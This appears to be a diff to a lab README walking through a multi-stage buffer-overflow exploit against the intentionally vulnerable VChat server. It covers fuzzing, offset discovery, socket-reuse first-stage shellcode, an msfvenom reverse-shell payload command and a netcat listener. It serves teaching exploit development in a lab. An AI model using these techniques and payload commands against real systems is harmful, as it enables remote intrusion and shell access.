@@ -3,38 +3,40 @@
 *Notice*: The following exploit, and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-kstet/)
 ___
 <!-- MITRE link's topic may be slightly differnt -->
-This exploit will use the technique of [Multi-Stage Exploits](https://attack.mitre.org/techniques/T1104/) where in this case the first stage provides install access and a jumping off point that the later stages use to gain more access to the underlying system. That is our first stage will be injected using a initial vulnerability in the software; in this case the VChat server. Once this initial stage has been deployed we can use it, either as an access point to deploy the final shellcode as we do here, or in a more complex scenarios this may be one of many stages used to download and deploy more complex malware onto a target system through this new channel.
+This exploit will use the [Multi-Stage Exploit](https://attack.mitre.org/techniques/T1104/) technique where in this case the first stage provides initial access and a jumping off point that the later stage will use to gain greater access to the underlying system. That is our first stage will be injected using an initial vulnerability in the software; in this case the VChat server. Once this initial stage has been deployed we can use it, either as an access point to deploy the final shellcode as we do here, or in a more complex scenario this may be one of many stages used to download and deploy more complex malware onto a target system through this new channel.
 
 <!-- Reword and Verify -->
-This is particularly useful in environments with constraints and limited resources available the the attacker within the application or service that is being attacked. This also in some cases allows attacker to gain further access into a system from say a phishing attack which first deploys a malicious applications, or injects shellcode into a process that later deploys a second stage allowing for greater access to the system.
+This kind of attack is particularly useful in environments where the initial vulnerability has constraints and limited resources available that the attacker must work within when attacking the application or service. Also in some cases this allows attackers to gain further access into a system from a non-technical inital exploit such as a phishing attack which first deploys a malicious applications, or injects shellcode into a process that later deploys a second stage allowing for access to the system.
 
 **Notice**: Please setup the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
 ## Exploitation
 ### PreExploitation
 1. **Windows**: Setup Vchat
    1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw 
-      1. Create the essfunc object File 
+      1. Create the essfunc object File.
 		```powershell
+		# Compile Essfunc Object file 
 		$ gcc.exe -c essfunc.c
 		```
       2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
 		```powershell
-		# Create a the DLL with an 
+		# Create a the DLL with a static (preferred) base address of 0x62500000
 		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
 		```
          * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
          * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
          * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
          * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
-      3. Compile the VChat application 
+      3. Compile the VChat application.
 		```powershell
+		# Compile and Link VChat
 		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
 		```
          * ```vchat.c```: The source file is "vchat.c"
          * ```-o vchat.exe```: The output file will be the executable "vchat.exe"
          * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll"
    2. Launch the VChat application 
-		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll
+		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll.
 2. **Linux**: Run NMap
 	```sh
 	# Replace the <IP> with the IP of the machine.
@@ -73,7 +75,7 @@ This phase of exploitation is where we launch the target application or binary a
 
 	<img src="Images/I1.png" width=800> 
 
-    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the windows search bar or on the desktop as shown below:
+    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
 			
 	<img src="Images/I1b.png" width = 200>
 
@@ -104,15 +106,15 @@ This phase of exploitation is where we launch the target application or binary a
 	<img src="Images/I3-4.png" width=800>
 
 #### Fuzzing
-SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in the [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
+SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in the [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platform's](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and is still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
 
-1. Open a terminal on the **Kali Linux Machine**
-2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing out own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor.
+1. Open a terminal on the **Kali Linux Machine**.
+2. Create a file ```KSTET.spk``` file with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing out own C based fuzzer. During this walkthrough we will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor though any editor may be used.
 	```sh
 	$ mousepad KSTET.spk
 	```
-	* If you do not have a GUI environment, a editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used 
-3. Define the FUZZER parameters, we are using [SPIKE](https://www.kali.org/tools/spike/) with the ```generic_send_tcp``` interpreter for TCP based fuzzing.  
+	* If you do not have a GUI environment, an editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used 
+3. Define the FUZZER's parameters, we are using [SPIKE](https://www.kali.org/tools/spike/) with the ```generic_send_tcp``` interpreter for TCP based fuzzing.  
 		
 	```
 	s_readline();
@@ -122,7 +124,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
     * ```s_readline();```: Return the line from the server
     * ```s_string("KSTET ");```: Specifies that we start each message with the *String* KSTET
     * ```s_string_variable("*");```: Specifies a String that we will mutate over, we can set it to * to say "any" as we do in our case 
-4. Use the Spike Fuzzer 	
+4. Use the Spike Fuzzer as shown below	
 	```
 	$ generic_send_tcp <VChat-IP> <Port> <SPIKE-Script> <SKIPVAR> <SKIPSTR>
 
@@ -138,7 +140,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4.png" width=600>
 
-	* Notice that the VChat appears to have crashed after our second message! We can see based on the stack's status that we do not need to send a message of length *5000* as was done when the server crashed (in my case). We can see that there is around 100 bytes of space before the series of `A`s stop.
+	* Notice that VChat appears to have crashed after our second message! We can see based on the stack's status that we do not need to send a message of length *5000* as was done when the server crashed (in my case). We can see that there is around 100 bytes of space before the series of `A`s stop.
 6. We can now try a few manual tests using the [`telnet`](https://linux.die.net/man/1/telnet) client as shown below. We range from a small set of four A's to near a hundred.
 
 	<img src="Images/I4b.png" width=600>
@@ -171,16 +173,16 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 		<img src="Images/I6.png" width=600> 
 
 #### Further Analysis
-1. Generate a Cyclic Pattern. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* program [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb). By analyzing the values stored in the register, we can tell where in memory the return address is stored. 
+1. Generate a Cyclic Pattern. We do this so we can tell *where exactly* the return address is located on the stack. We can use the *Metasploit* script [pattern_create.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb) to generate this string. By analyzing the values stored in the register which will be a subset of the generated string after a crash, we can tell where in memory the return address is stored. 
 	```
 	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
 	```
 	* This will allow us to inject a new return address at that location.
-2. Run the [exploit1.py](./SourceCode/exploit1.py) to inject the cyclic pattern into the VChat program's stack and observe the EIP register. 
+2. Modify your exploit code to reflect the [exploit1.py](./SourceCode/exploit1.py) program and run it to inject the cyclic pattern into the VChat program's stack and observe the EIP register. 
 
 	<img src="Images/I9.png" width=600> 
 
-3. Notice that the EIP register reads `41326341` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on out search strings position in the pattern. 
+3. Notice that the EIP register reads `41326341` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the address offset based on our search string's position in the pattern. 
 	```
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41326341
 	```
@@ -188,20 +190,19 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I10.png" width=600> 
 
-4. The next thing that is done, is to modify the exploit program to reflect the file [exploit2.py](./SourceCode/exploit2.py).
+4.  Now modify the exploit program to reflect the code in the  [exploit2.py](./SourceCode/exploit2.py) script and run the exploit against VChat.
    * We do this to validate that we have the correct offset for the return address!
 
 		<img src="Images/I11.png" width=600>
 
-		* See that the EIP is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program.
+		* See that the EIP is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the target program.
 		* Note: It took a few runs for this to work and update on the Immunity debugger.
-5. Use the [mona.py](https://github.com/corelan/mona) python program within the Immunity Debugger to determine some useful information. We run the command ```!mona findmsp``` in the command line at the bottom of Immunity Debugger. **Note:** We must have sent the cyclic pattern in the stack frame at this time!
+5. Use the [mona.py](https://github.com/corelan/mona) python program within Immunity Debugger to determine some useful information about our target process. While the *cyclic pattern* from [exploit1.py](./SourceCode/exploit1.py) is in memory run the command ```!mona findmsp``` in the command line at the bottom of Immunity Debugger GUI. **Note:** We must have sent the cyclic pattern and it must be located in the stack frame at this time!
 
 	<img src="Images/I12.png" width=600>
 
-      * We can see that the offset (Discovered with [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) earlier) is at the byte offset of 66, with the ESP at the offset of 70 and has 24 bytes following it, and the EBP is at the byte offset 62.
-      * The most important thing we learn is that we have 984 bytes to work with!  
-6. Open the `Executable Modules` window from the **views** tab. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction to pick, since we want to avoid any *windows dynamic libraries* since their base addresses may vary between executions and systems. 
+      * We can see that the offset (Discovered with [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) earlier) is at the byte offset of `66`, with the ESP at the offset of `70` and has `24` bytes following it, and the EBP is at the byte offset `62`.
+6. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction to pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems. 
 
 	<img src="Images/I13.png" width=600>
 
@@ -217,24 +218,24 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	<img src="Images/I15.png" width=600>
 
       * We can see there are nine possible `jmp esp` instructions in the essfunc dll that we can use, any should work. We will use the last one `0x625014E6`
-8. Use a program like [exploit3.py](./SourceCode/exploit3.py) to verify that this works.
+8. Modify your exploit program to reflect the [exploit3.py](./SourceCode/exploit3.py) script, we use this to verify that the 1jmp esp` instruction we chose works.
 	
 	https://github.com/DaintyJet/VChat_KSTET_Multi/assets/60448620/1a188006-7304-4b1a-bc47-b651c4c8767b
 
-   1. Click on the black button highlighted below, enter in the address we decided in the previous step
+   1. Click on the black button highlighted below, and enter in the address we decided in the previous step.
 
 		<img src="Images/I16.png" width=600>
 
-   2. Set a breakpoint at the desired address (Right click)
+   2. Set a breakpoint at the desired address (Right click).
 
 		<img src="Images/I17.png" width=600>
 
-   3. Run the [exploit3.py](./SourceCode/exploit3.py) program till a overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
+   3. Run the [exploit3.py](./SourceCode/exploit3.py) program till an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
 
 		<img src="Images/I18.png" width=600>
 
          * Notice that the EIP now points to an essfunc.dll address!
-	4. Once the overflow occurs click the *step into* button highlighted below 
+	4. Once the overflow occurs click the *step into* button highlighted below.
 
 		<img src="Images/I19.png" width=600>
 
@@ -245,15 +246,14 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 Now that we have all the necessary parts for the creation of a exploit we will discuss what we have done so far (the **exploit.py** files), and how we can now expand our efforts to gain a shell in the target machine.
 ### Exploitation
-
 #### Stack Space 
-1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the overwritten return address we use in the *EIP* register. As we have done in previous exploits we will preform a short relative jump to the start of the buffer so we can use the sixty six bytes that precede our return address for our first stage shell code.
+1. We know from one of our previous runs of `mona.py` (`!mona findmsp`) that we have a very limited amount of space following the overwritten return address we use in the *EIP* register. As we have done in previous exploits we will preform a short relative jump to the start of the buffer so we can use the 66 bytes that precede our return address for our first stage shell code.
 
-   1. Set a breakpoint at the `JMP ESP` instruction as we did in the previous section
+   1. Set a breakpoint at the `JMP ESP` instruction as we did in the previous section.
 
 		<img src="Images/I17.png" width=600>
 
-   2. Run the [exploit3.py](./SourceCode/exploit3.py) program till a overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
+   2. Run the [exploit3.py](./SourceCode/exploit3.py) program till an overflow occurs (See EIP/ESP and stack changes), you should be able to tell by the black text at the bottom the the screen that says `Breakpoint at ...`.
 
 		<img src="Images/I18.png" width=600>
 
@@ -292,9 +292,9 @@ Now that we have all the necessary parts for the creation of a exploit we will d
 	https://github.com/DaintyJet/VChat_KSTET_Multi/assets/60448620/682ab5be-aa3d-47f0-a26a-a107011919a1
 
 #### Shell Code Generation
-Due to the limited space on the stack we have to work with (66 bytes) we will be using the techniques discussed in the [Code Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse). Where we will reuse the code from libraries that have already be loaded by our target *VChat*. As this is a TCP server, it should have the necessary programs loaded for us.  
+Due to the limited space on the stack we have to work with (66 bytes) we will be using the techniques discussed in the [Code Reuse](https://github.com/DaintyJet/VChat_GTER_CodeReuse) walktrhough. Where we will reuse code from libraries that have already been loaded by our target *VChat*. As this is a TCP server, it should have the necessary programs loaded for us to create a first stage shellcode which loads and executes a second stage.  
 
-1. The function that we need to use for this is the `recv(...)` function call. This has the following signature. 
+1. The first function that we need to use for this is the `recv(...)` function call. This has the following signature: 
 	```
 	int recv(
 		[in]  SOCKET s,
@@ -304,9 +304,9 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 	);
 	```
 	* `s`: This is a Socket Descriptor, which is a kind of [File Descriptor](https://learn.microsoft.com/en-us/windows/win32/fileio/file-handles) (Or Handle). This is really just an integer value
-	* `buf`: A pointer to the char array to place incoming data
-	* `len`: The length of the buffer 
-	* `flags`: Flags used to control the behavior of the function
+	* `buf`: A pointer to the char array to place incoming data.
+	* `len`: The length of the buffer. 
+	* `flags`: Flags used to control the behavior of the function.
 2. Now to go about finding some of the information needed for our exploit we can do the following.
 
 	https://github.com/DaintyJet/VChat_KSTET_Multi/assets/60448620/6ba1aa4f-35a1-49c4-8c06-fe3740fc98df
@@ -372,9 +372,9 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 
 	2) Run nasm on the target assembly, Run: `nasm -f elf32 -o shellcode.o shellcode.asm`
 		* `nasm`: Netwide Assembler, assembles assembly into x86 machine code.
-		* `-f elf32`: elf32 format
-		* `-o shellcode.o`: Shellcode File
-		* `shellcode.asm`: input file
+		* `-f elf32`: Specify the elf32 format
+		* `-o shellcode.o`: Shellcode File output
+		* `shellcode.asm`: Input file
 6) Now we can extract the binary with a simple [shell script](./SourceCode/extract.sh).
 	```sh
 	for i in $(objdump -d shellcode.o -M intel | grep "^ " | cut -f2); do 
@@ -397,7 +397,7 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 
 	https://github.com/DaintyJet/VChat_KSTET_Multi/assets/60448620/88e9ea66-42f0-42b4-ad1b-00e8da714aba
 
-	1. Set a breakpoint at the `jmp esp` instruction 
+	1. Set a breakpoint at the `jmp esp` instruction. 
 
 		<img src="Images/I33.png" width=800>
 
@@ -405,17 +405,17 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
 
 		<img src="Images/I34.png" width=800>
 
-	3. Set a breakpoint on the `TEST EAX,EAX` instruction, and click run. Once you hit this click run again. Once you are satisfied this program is working correctly, as the EDI register should be incrementing; we can stop since there is no guarantee our Socket Handle will be a reasonably low number 
+	3. Set a breakpoint on the `TEST EAX,EAX` instruction, and click run. Once you hit this click run again. Once you are satisfied this program is working correctly, as the EDI register should be incrementing; we can stop since there is no guarantee our Socket Handle will be a reasonably low number.
 
 		<img src="Images/I35.png" width=800>
 
-2. Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit as shown in [exploit6.py](./SourceCode/exploit6.py) 
+2. Generate the second stage reverse shell code using ```msfvenom``` program, and create a exploit script as shown in [exploit6.py](./SourceCode/exploit6.py) 
 
 	```
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
-    	* `windows/shell_reverse_tcp`: Reverse TCP payload for windows
+    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
     	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7
     	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080
     	* `EXITFUNC=thread`: Create a thread to run the payload
@@ -425,13 +425,13 @@ Due to the limited space on the stack we have to work with (66 bytes) we will be
     	* `SHELL`: Shell Variable name
   	* `-b`: Specifies bad chars and byte values. This is given in the byte values 
       	* `\x00x\0a\x0d`: Null char, carriage return, and newline. 
-3. [exploit6.py](./SourceCode/exploit6.py) first sends the Stage-1 exploit as done in [exploit5.py](./SourceCode/exploit5.py), then waits a few seconds and send the second stage of the exploit which will attempt to reach out to our *Kali Linux* machine on port 8080. To add some resiliency to inaccurate jumps we pad the buffer the `recv(...)` call writes to which is 1024 bytes with `\x90` the NOP instruction by adding them to the start of the second stage. 
+3. The [exploit6.py](./SourceCode/exploit6.py) script first sends the Stage-1 exploit as is done in the [exploit5.py](./SourceCode/exploit5.py) script, then it waits a few seconds and send the second stage of the exploit which will attempt to reach out to our *Kali Linux* machine on port 8080. To add some resiliency to inaccurate jumps we pad the buffer the `recv(...)` call writes to which is 1024 bytes with `\x90` the NOP instruction by adding them to the start of the second stage. 
 
 	<img src="Images/I36.png" width=800>
 
 	* Sometimes this took a few times to work.
 
-*Note*: Be sure to run the [netcat](https://linux.die.net/man/1/nc) listener on our Kali machine for port 8080 while running [exploit6.py](./SourceCode/exploit6.py)
+*Note*: Be sure to run the [netcat](https://linux.die.net/man/1/nc) listener on our Kali machine for port 8080 while running [exploit6.py](./SourceCode/exploit6.py)!
 
 ```
 $ nc -l -v -p 8080
@@ -498,16 +498,14 @@ jnz socket_loop         ; If recv() failed, jump back to the socket loop where
 						; EDI will be increased to check the next socket handle
 ```
 
-We first adjust the stack pointer that is stored in the `ESP` register: `sub esp,0x64`. This is done to prevent the function calls from overwriting our shell code.
+We first adjust the stack pointer that is stored in the `ESP` register: `sub esp,0x64`. This is done to prevent the function calls from overwriting our shell code when stack frames and arguments are written to the stack.
 
 
-The `EDI` register will be used to store our Socket Handle; this is simply an integer value. Since we are brute forcing this we need to start at zero. We achieve this with the following instruction: `xor edi,edi`. By XORing a value with itself we achieve the value of zero.
-
+The `EDI` register will be used to store our Socket Handle; this is simply an integer value. Since we are brute forcing this we need to start at zero. We achieve this with the following instruction: `xor edi,edi`. By XORing a value with itself we get the value of zero.
 
 Following this we have a label `socket_loop:`. This is used to create the loop by giving us a way to *easily* jump backwards in the code. 
 
-
-Next we configure the stack for a call to the `recv(...)` function; Remember that we place the arguments onto the stack in reverse order. First we zero out a register with the following instruction: `xor ebx,ebx`. This is done so we can place a zero onto the stack for the *Flag* argument with the instruction: `push ebx`. Then we add 0x4 to the *bh* register: `add bh,0x4`, this is done so the `EBX` register which was zero now contains the value 1024. This is because we place the value `0x4` into the *high* registers (bytes 8 - 15) of the `EBX` register. The value 1024 is placed onto the stack again with the push instruction: `push ebx`.  The instructions `mov ebx,esp` and `add ebx,0x64` setup the location we will write the received data to, in this case we  we load the stack pointer into the `EBX` register, and sets it to the original `ESP` location before the initial subtraction; This is so the received second stage will be written to a nearby location. This is added to the stack with the instruction `push ebx`. The final parameter is configured with the instructions `inc edi` and `push edi`; the `inc edi` is used for our brute forcing of the Socket Handle and `push edi` places it onto the stack. Finally we make the call to the `recv(...)` function using `mov eax,0x74F123A0` by moving the address of `recv(...)` and using `call eax` call the function. We then check if the function succeeded using `test eax,eax` and if the returned value is not zero `jnz socket_loop` we repeat the loop; otherwise we fall through into the stage-2 shellcode we wrote to the stack with our `recv(...)` call.  
+Next we configure the stack for a call to the `recv(...)` function; Remember that we place the arguments onto the stack in reverse order. First we zero out a register with the following instruction: `xor ebx,ebx`. This is done so we can place a zero onto the stack for the *Flag* argument with the instruction: `push ebx`. Then we add 0x4 to the *bh* register: `add bh,0x4`, this is done so the `EBX` register which was zero now contains the value 1024. This is because we place the value `0x4` into the *high* registers (bytes 8 - 15) of the `EBX` register. The value 1024 is placed onto the stack again with the push instruction: `push ebx`.  The instructions `mov ebx,esp` and `add ebx,0x64` setup the location we will write the received data to, in this case we load the stack pointer into the `EBX` register, and sets it to the original `ESP` location before the initial subtraction; This is so the received second stage will be written to a nearby location. This is added to the stack with the instruction `push ebx`. The final parameter is configured with the instructions `inc edi` and `push edi`; the `inc edi` is used for our brute forcing of the Socket Handle and `push edi` places it onto the stack. Finally we make the call to the `recv(...)` function using `mov eax,0x74F123A0` by moving the address of `recv(...)` that we discovered earlier (subject to change) and using `call eax` to call the function. We then check if the function succeeded using `test eax,eax` and if the returned value is not zero `jnz socket_loop` we repeat the loop; otherwise we fall through into the stage-2 shellcode we wrote to the stack with our `recv(...)` call.  
 
 
 ## Test code
